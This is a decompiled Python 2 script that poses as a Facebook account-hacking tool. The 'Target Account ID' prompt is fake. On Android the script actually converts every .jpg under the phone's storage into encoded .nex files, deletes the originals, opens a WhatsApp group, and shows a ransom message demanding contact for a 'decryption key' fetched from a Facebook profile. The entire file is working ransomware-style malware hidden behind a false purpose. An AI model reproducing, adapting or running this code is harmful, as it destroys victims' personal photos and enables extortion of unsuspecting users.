# uncompyle6 version 3.7.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <script>
# Compiled at: 2020-08-31 10:19:01
import os, base64, zlib, sys
W = '\x1b[1;37m'
N = '\x1b[0m'
R = '\x1b[1;37m\x1b[31m'
B = '\x1b[1;37m\x1b[34m'
G = '\x1b[1;32m'
Y = '\x1b[1;33;40m'
ranbanner = (' \n{} \xe2\x96\x88\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 {}\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x88\xe2\x94\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x94\x80\xe2\x94\x80 \xe2\x96\x84\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x80 \xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\n{} \xe2\x96\x88\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 {}\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x84\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x94\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x94\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x94\x80\xe2\x96\x88 \xe2\x96\x88 \xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\n{} \xe2\x96\x80\xe2\x94\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 {}\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x80\xe2\x94\x80\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x94\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x94\x80\xe2\x96\x80\xe2\x94\x80 \xe2\x96\x80 \xe2\x94\x80\xe2\x96\x80\xe2\x94\x80\n    Developer : NexHacker\n\n').format(G, R, G, R, G, R, W)
expbanner = (' {}\n\nYoU ArE \n~~~~~~\n \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x84\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x84\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\n \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x91 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\n \xe2\x96\x80\xe2\x96\x91\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x91\xe2\x96\x80 \xe2\x96\x91\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\n \n{}All Your Pictures Are {}Encypted{}\nContact Me to Get {}Decyption {}Key\n{}Ask For Key Here\n{}https://chat.whatsapp.com/GTson8XfqUZENhUkL4OA8q\n\n').format(R, W, R, W, G, W, Y, W)
try:
    import requests as rq
    print G + '(' + R + '>' + G + ')' + ' Module Available'
except:
    print G + '(' + R + '>' + G + ')' + ' Module Installing'
    os.system('pip2 install requests')
    import requests as rq

pathx = '/storage/emulated/0/DCIM/Camera/'

def encyptx():
    file = os.popen('ls ' + pathx).read()
    tpath = '/storage/emulated/0/'
    try:
        os.system('mkdir ' + tpath + 'nexencypted')
    except:
        pass

    tfile = os.popen('find ' + tpath + ' *').read()
    filex = file.split()
    tfilex = tfile.split()
    devc = os.popen('uname -a').read().split()[(-1)].lower()
    i = 0
    print '\n\n'
    os.system('clear')
    if devc == 'android':
        for i in range(len(tfilex)):
            dataf = tfilex[i]
            try:
                if dataf[-3:] == 'jpg':
                    fopn = open(dataf, 'rb').read()
                    encd = zlib.compress(base64.encodestring(fopn))
                    sys.stdout.write(('\r {}Getting {}{} {}Bytes').format(G, W, len(encd), G))
                    sys.stdout.flush()
                    encw = open(tpath + 'nexencypted/' + str(i) + '.nex', 'wb')
                    encw.write(encd)
                    encw.close()
                    os.system(('rm {}').format(dataf))
            except:
                pass


def decyptx():
    ipass = raw_input(G + '\n[!]Decyption Key : ' + W).lower()
    print '\n'
    kurl = 'https://mbasic.facebook.com/profile.php?id=100006143266745'
    keyi = rq.get(kurl).text.split('$')[1]
    if ipass == str(keyi):
        pathx = '/storage/emulated/0/nexencypted/'
        patho = '/storage/emulated/0/nexdecypted/'
        try:
            os.system('mkdir ' + patho)
        except:
            pass

        file = os.popen('ls ' + pathx).read()
        filex = file.split()
        i = 0
        for i in range(len(filex)):
            dataf = filex[i]
            if dataf[-3:] == 'nex':
                fopn = open(pathx + dataf, 'rb').read()
                encd = base64.decodestring(zlib.decompress(fopn))
                sys.stdout.write(('\r {}Decypting {} {} {}Bytes').format(W, G, len(encd), W))
                sys.stdout.flush()
                encw = open(patho + 'nexdec' + str(i) + '.jpg', 'wb')
                encw.write(encd)
                encw.close()
                os.system(('rm {}').format(pathx + dataf))

    else:
        print 'Incorrect !'
        decyptx()


def login():
    e = raw_input(Y + '(>)' + G + 'Target Account ID : ' + W)
    if len(e) > 2:
        print W + '\n[~]Connecting to Facebook .....\n'
        print G + ('[~]Getting ID {}{} {}Data From Server').format(R, e, G)
        print R + '\n[!]Do Not Exit While The Process is Running'
    else:
        print R + '[!]Invalid ID'


def joingroup():
    cmd = 'am start https://chat.whatsapp.com/GTson8XfqUZENhUkL4OA8q'
    os.system(cmd)


print ranbanner
login()
encyptx()
joingroup()
print expbanner
decyptx()
# okay decompiling patched.pyc
